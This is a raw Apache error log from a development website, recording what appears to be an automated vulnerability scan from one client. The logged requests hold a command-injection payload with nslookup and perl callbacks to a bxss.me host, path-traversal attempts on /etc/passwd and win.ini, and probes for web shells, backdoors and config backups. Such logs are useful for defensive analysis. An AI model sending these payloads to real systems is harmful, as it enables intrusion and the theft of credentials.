[Wed Jul 07 19:27:05.076135 2021] [core:error] [pid 14150] (36)File name too long: [client 27.147.202.214:8782] AH00036: access to /;(nslookup hitslkggnnbjbd9b06.bxss.me||perl -e "gethostbyname('hitslkggnnbjbd9b06.bxss.me')")|(nslookup hitslkggnnbjbd9b06.bxss.me||perl -e "gethostbyname('hitslkggnnbjbd9b06.bxss.me')")&(nslookup hitslkggnnbjbd9b06.bxss.me||perl -e "gethostbyname('hitslkggnnbjbd9b06.bxss.me')").php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitslkggnnbjbd9b06.bxss.me||perl -e "gethostbyname('hitslkggnnbjbd9b06.bxss.me')")|(nslookup hitslkggnnbjbd9b06.bxss.me||perl -e "gethostbyname('hitslkggnnbjbd9b06.bxss.me')")&(nslookup hitslkggnnbjbd9b06.bxss.me||perl -e "gethostbyname('hitslkggnnbjbd9b06.bxss.me')").php')
[Wed Jul 07 19:27:05.189359 2021] [negotiation:error] [pid 14361] [client 27.147.202.214:1724] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/how_to (None could be negotiated).
[Wed Jul 07 19:27:05.586600 2021] [php7:error] [pid 14475] [client 27.147.202.214:1792] script '/var/www/html/dev.wilkescw.com/images/_notes/gni4ssr7wg6v.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:05.730967 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config (another copy).php' not found or unable to stat
[Wed Jul 07 19:27:06.118608 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config (copy).php' not found or unable to stat
[Wed Jul 07 19:27:06.412212 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config - Copy.php' not found or unable to stat
[Wed Jul 07 19:27:06.734322 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config - Copy (2).php' not found or unable to stat
[Wed Jul 07 19:27:07.062422 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/Copy of config.php' not found or unable to stat
[Wed Jul 07 19:27:07.353356 2021] [authz_core:error] [pid 14469] [client 27.147.202.214:8403] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/css/.htaccess~
[Wed Jul 07 19:27:07.393305 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/Copy of Copy of config.php' not found or unable to stat
[Wed Jul 07 19:27:07.697436 2021] [authz_core:error] [pid 14469] [client 27.147.202.214:8403] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/css/.htaccess.old
[Wed Jul 07 19:27:07.716887 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/Copy (2) of config.php' not found or unable to stat
[Wed Jul 07 19:27:08.038003 2021] [authz_core:error] [pid 14469] [client 27.147.202.214:8403] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/css/.htaccess.save
[Wed Jul 07 19:27:08.039150 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/Copy_(1)_of_config.php' not found or unable to stat
[Wed Jul 07 19:27:08.792221 2021] [core:error] [pid 14694] [client 27.147.202.214:3890] AH00126: Invalid URI in request GET /fonts/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:27:10.606971 2021] [authz_core:error] [pid 14460] [client 27.147.202.214:7692] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/.htaccess~
[Wed Jul 07 19:27:10.934778 2021] [authz_core:error] [pid 14460] [client 27.147.202.214:7692] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/.htaccess.old
[Wed Jul 07 19:27:11.263295 2021] [authz_core:error] [pid 14460] [client 27.147.202.214:7692] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/.htaccess.save
[Wed Jul 07 19:27:11.311658 2021] [php7:error] [pid 14331] [client 27.147.202.214:8401] script '/var/www/html/dev.wilkescw.com/images/_notes/apc.php' not found or unable to stat
[Wed Jul 07 19:27:11.730078 2021] [core:error] [pid 14483] [client 27.147.202.214:4052] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:11.758673 2021] [php7:error] [pid 14340] [client 27.147.202.214:4050] script '/var/www/html/dev.wilkescw.com/fonts/56tsjuvio7ub.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:12.034661 2021] [core:error] [pid 14380] [client 27.147.202.214:1644] AH00126: Invalid URI in request GET /js//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:12.043760 2021] [authz_core:error] [pid 14356] [client 27.147.202.214:4064] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/_notes/.htaccess
[Wed Jul 07 19:27:12.445863 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config1.php' not found or unable to stat
[Wed Jul 07 19:27:12.537085 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/_notes/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:27:12.767696 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/r57shell.php' not found or unable to stat
[Wed Jul 07 19:27:12.773908 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config2.php' not found or unable to stat
[Wed Jul 07 19:27:12.797306 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/webadmin.php' not found or unable to stat
[Wed Jul 07 19:27:13.085552 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/r57.php' not found or unable to stat
[Wed Jul 07 19:27:13.095274 2021] [php7:error] [pid 14379] [client 27.147.202.214:1557] script '/var/www/html/dev.wilkescw.com/images/apc.php' not found or unable to stat
[Wed Jul 07 19:27:13.222788 2021] [php7:error] [pid 14400] [client 27.147.202.214:4059] script '/var/www/html/dev.wilkescw.com/images/_notes/pi.php' not found or unable to stat
[Wed Jul 07 19:27:13.401829 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/r58.php' not found or unable to stat
[Wed Jul 07 19:27:13.729127 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/c99shell.php' not found or unable to stat
[Wed Jul 07 19:27:13.752890 2021] [authz_core:error] [pid 14473] [client 27.147.202.214:4054] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/images/.htaccess
[Wed Jul 07 19:27:13.903597 2021] [php7:error] [pid 14400] [client 27.147.202.214:4059] script '/var/www/html/dev.wilkescw.com/images/_notes/php.php' not found or unable to stat
[Wed Jul 07 19:27:14.055514 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/c99.php' not found or unable to stat
[Wed Jul 07 19:27:14.240166 2021] [php7:error] [pid 14400] [client 27.147.202.214:4059] script '/var/www/html/dev.wilkescw.com/images/_notes/i.php' not found or unable to stat
[Wed Jul 07 19:27:14.382893 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/nstview.php' not found or unable to stat
[Wed Jul 07 19:27:14.401232 2021] [php7:error] [pid 14410] [client 27.147.202.214:1635] script '/var/www/html/dev.wilkescw.com/config (3rd copy).php' not found or unable to stat
[Wed Jul 07 19:27:14.405230 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/images/phpinfo.php' not found or unable to stat
[Wed Jul 07 19:27:14.576630 2021] [php7:error] [pid 14400] [client 27.147.202.214:4059] script '/var/www/html/dev.wilkescw.com/images/_notes/test.php' not found or unable to stat
[Wed Jul 07 19:27:14.720610 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config (third copy).php' not found or unable to stat
[Wed Jul 07 19:27:14.920782 2021] [php7:error] [pid 14368] [client 27.147.202.214:8792] script '/var/www/html/dev.wilkescw.com/images/_notes/temp.php' not found or unable to stat
[Wed Jul 07 19:27:15.044619 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/images/pi.php' not found or unable to stat
[Wed Jul 07 19:27:15.050931 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config (4th copy).php' not found or unable to stat
[Wed Jul 07 19:27:15.246171 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/nst.php' not found or unable to stat
[Wed Jul 07 19:27:15.250842 2021] [php7:error] [pid 14368] [client 27.147.202.214:8792] script '/var/www/html/dev.wilkescw.com/images/_notes/info.php' not found or unable to stat
[Wed Jul 07 19:27:15.376061 2021] [php7:error] [pid 14398] [client 27.147.202.214:8402] script '/var/www/html/dev.wilkescw.com/config - Copy - Copy.php' not found or unable to stat
[Wed Jul 07 19:27:15.556884 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/rst.php' not found or unable to stat
[Wed Jul 07 19:27:15.565147 2021] [php7:error] [pid 14410] [client 27.147.202.214:1635] script '/var/www/html/dev.wilkescw.com/images/r57shell.php' not found or unable to stat
[Wed Jul 07 19:27:15.618130 2021] [negotiation:error] [pid 13762] [client 27.147.202.214:4053] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/important_information (None could be negotiated).
[Wed Jul 07 19:27:15.694966 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/images/php.php' not found or unable to stat
[Wed Jul 07 19:27:15.868353 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/r57eng.php' not found or unable to stat
[Wed Jul 07 19:27:15.911452 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/images/r57.php' not found or unable to stat
[Wed Jul 07 19:27:16.020769 2021] [php7:error] [pid 14453] [client 27.147.202.214:4008] script '/var/www/html/dev.wilkescw.com/images/i.php' not found or unable to stat
[Wed Jul 07 19:27:16.194682 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/shell.php' not found or unable to stat
[Wed Jul 07 19:27:16.203813 2021] [core:error] [pid 14393] [client 27.147.202.214:8409] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:16.239036 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/r58.php' not found or unable to stat
[Wed Jul 07 19:27:16.246131 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/logoutEP5yk.php' not found or unable to stat
[Wed Jul 07 19:27:16.342922 2021] [negotiation:error] [pid 14458] [client 27.147.202.214:4057] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/index (None could be negotiated).
[Wed Jul 07 19:27:16.343417 2021] [php7:error] [pid 14340] [client 27.147.202.214:4050] script '/var/www/html/dev.wilkescw.com/images/test.php' not found or unable to stat
[Wed Jul 07 19:27:16.519676 2021] [php7:error] [pid 14352] [client 27.147.202.214:8783] script '/var/www/html/dev.wilkescw.com/images/_notes/dra.php' not found or unable to stat
[Wed Jul 07 19:27:16.571413 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/c99shell.php' not found or unable to stat
[Wed Jul 07 19:27:16.649186 2021] [php7:error] [pid 14340] [client 27.147.202.214:4050] script '/var/www/html/dev.wilkescw.com/images/temp.php' not found or unable to stat
[Wed Jul 07 19:27:16.834415 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/r.php' not found or unable to stat
[Wed Jul 07 19:27:16.905051 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/c99.php' not found or unable to stat
[Wed Jul 07 19:27:16.908305 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/6gUgPlogout.php' not found or unable to stat
[Wed Jul 07 19:27:16.974637 2021] [php7:error] [pid 14340] [client 27.147.202.214:4050] script '/var/www/html/dev.wilkescw.com/images/info.php' not found or unable to stat
[Wed Jul 07 19:27:17.161274 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/lol.php' not found or unable to stat
[Wed Jul 07 19:27:17.189827 2021] [core:error] [pid 14467] [client 27.147.202.214:2883] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:17.239387 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/nstview.php' not found or unable to stat
[Wed Jul 07 19:27:17.491982 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/zehir.php' not found or unable to stat
[Wed Jul 07 19:27:17.581631 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/nst.php' not found or unable to stat
[Wed Jul 07 19:27:17.683646 2021] [negotiation:error] [pid 14149] [client 27.147.202.214:1730] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/logout (None could be negotiated).
[Wed Jul 07 19:27:17.908407 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/rst.php' not found or unable to stat
[Wed Jul 07 19:27:18.247389 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/images/r57eng.php' not found or unable to stat
[Wed Jul 07 19:27:18.396809 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:27:18.589897 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/shell.php' not found or unable to stat
[Wed Jul 07 19:27:18.730602 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:18.927771 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/dra.php' not found or unable to stat
[Wed Jul 07 19:27:19.043494 2021] [php7:error] [pid 13806] [client 27.147.202.214:1301] script '/var/www/html/dev.wilkescw.com/admin/rabmsehhbapu.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:19.110346 2021] [core:error] [pid 14340] [client 27.147.202.214:4050] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:19.435305 2021] [core:error] [pid 13818] [client 27.147.202.214:1447] AH00126: Invalid URI in request GET /css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:19.599572 2021] [core:error] [pid 14692] [client 27.147.202.214:4000] AH00126: Invalid URI in request GET /admin/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:27:19.611980 2021] [php7:error] [pid 14473] [client 27.147.202.214:4054] script '/var/www/html/dev.wilkescw.com/images/_notes/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:19.809165 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/r.php' not found or unable to stat
[Wed Jul 07 19:27:20.151231 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/lol.php' not found or unable to stat
[Wed Jul 07 19:27:20.492201 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/zehir.php' not found or unable to stat
[Wed Jul 07 19:27:22.906206 2021] [core:error] [pid 14150] [client 27.147.202.214:8782] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:23.013521 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:27:23.224117 2021] [autoindex:error] [pid 14391] [client 27.147.202.214:8400] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:23.224715 2021] [php7:error] [pid 14379] [client 27.147.202.214:1557] script '/usr/share/apache2/icons/32jbd1lzn7t4.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:27:23.940881 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/logout (copy).php' not found or unable to stat
[Wed Jul 07 19:27:23.995851 2021] [php7:error] [pid 14458] [client 27.147.202.214:4057] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/?981551@
[Wed Jul 07 19:27:24.017685 2021] [core:error] [pid 14465] [client 27.147.202.214:4022] AH00126: Invalid URI in request GET /icons/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:27:24.144563 2021] [core:error] [pid 14341] [client 27.147.202.214:1448] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:27:24.264033 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/logout - Copy.php' not found or unable to stat
[Wed Jul 07 19:27:24.444290 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:24.468682 2021] [core:error] [pid 14410] [client 27.147.202.214:1635] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:27:24.606165 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/Copy of logout.php' not found or unable to stat
[Wed Jul 07 19:27:24.693503 2021] [autoindex:error] [pid 14149] [client 27.147.202.214:1730] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:24.768493 2021] [php7:error] [pid 14469] [client 27.147.202.214:8403] script '/var/www/html/dev.wilkescw.com/images/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:27:24.950881 2021] [php7:error] [pid 14332] [client 27.147.202.214:4058] script '/var/www/html/dev.wilkescw.com/logout1.php' not found or unable to stat
[Wed Jul 07 19:27:24.973468 2021] [autoindex:error] [pid 14398] [client 27.147.202.214:8402] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:24.980991 2021] [autoindex:error] [pid 14473] [client 27.147.202.214:4054] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:25.319308 2021] [autoindex:error] [pid 14473] [client 27.147.202.214:4054] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:25.353252 2021] [autoindex:error] [pid 14147] [client 27.147.202.214:1443] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:25.373564 2021] [autoindex:error] [pid 14395] [client 27.147.202.214:3835] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:27:25.440748 2021] [autoindex:error] [pid 14351] [client 27.147.202.214:4309] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://dev.wilkescw.com/
